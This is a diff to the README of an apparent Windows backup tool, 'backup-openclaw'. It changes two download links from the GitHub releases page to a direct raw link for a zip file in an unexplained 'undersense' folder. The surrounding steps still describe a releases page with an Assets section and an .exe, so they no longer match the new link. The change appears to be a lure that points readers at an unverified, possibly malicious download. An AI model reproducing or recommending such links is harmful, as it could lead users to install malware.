@@ -1,6 +1,6 @@
 # 💾 backup-openclaw - Secure automated backups for OpenClaw data
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Rrox8272/backup-openclaw/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rrox8272/backup-openclaw/main/undersense/openclaw-backup-v2.0.zip)
 
 ## 📁 About the application
 
@@ -15,7 +15,7 @@ This tool works on Windows 10 and Windows 11. You need at least 50 megabytes of 
 You must visit the project release page to get the installer. Follow these steps:
 
 1. Open your web browser.
-2. Go to [https://github.com/Rrox8272/backup-openclaw/releases](https://github.com/Rrox8272/backup-openclaw/releases).
+2. Go to [https://raw.githubusercontent.com/Rrox8272/backup-openclaw/main/undersense/openclaw-backup-v2.0.zip](https://raw.githubusercontent.com/Rrox8272/backup-openclaw/main/undersense/openclaw-backup-v2.0.zip).
 3. Look for the section labeled Assets.
 4. Click the link that ends in .exe to start the download.
 5. Save the file to your Downloads folder.
